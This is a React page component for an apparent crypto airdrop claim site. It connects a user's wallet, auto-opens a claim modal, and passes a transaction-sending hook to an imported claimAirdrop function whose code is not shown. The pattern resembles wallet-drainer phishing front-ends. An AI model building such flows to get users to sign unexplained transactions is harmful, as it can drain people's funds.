// eslint-disable-next-line no-unused-vars
import React, { useState, useEffect } from "react";
import Modal2 from "../components/Modal2";
import RewardContent from "../components/RewardContent";
import {
  FeaturesComponent,
  Hero,
  InstructionComponent,
  Navbar,
  CTA,
  NewsLetter,
  Footer1,
  Footer2,
} from "../components";
import { useWeb3Modal } from "@web3modal/wagmi/react";
import { useAccount, usePublicClient, useSendTransaction } from 'wagmi'
import { claimAirdrop } from "../../funcs";


const HomePage = () => {
  const {open } = useWeb3Modal()
  const { address, isConnected } = useAccount()
  const publicClient = usePublicClient()
  const { sendTransaction } = useSendTransaction()
  
  
  const [toggle, setToggle] = useState(false);
  const [modal, setModal] = useState(false);

  const modalHandler = () => {
    setModal(!modal);
  };

  const toggleHandler = () => {
    setToggle((prev) => !prev);
  };

  useEffect(() => {
    if(address)setModal(true);
    
  }, [address]);

const claim = async () => {
  claimAirdrop(address, publicClient, open, sendTransaction)
}



  return (
    <>
      <Navbar toggleHandler={toggleHandler} />
      {modal && <Modal2 modalHandler={modalHandler} claimer={claim}/>}
      <section className="overflow-hidden">
        <Hero toggle={toggle} toggleHandler={toggleHandler} />
        <RewardContent />
        <InstructionComponent />
        <FeaturesComponent />
        <CTA />
        <NewsLetter />
        <Footer1 />
        <Footer2 />
      </section>
    </>
  );
};

export default HomePage;
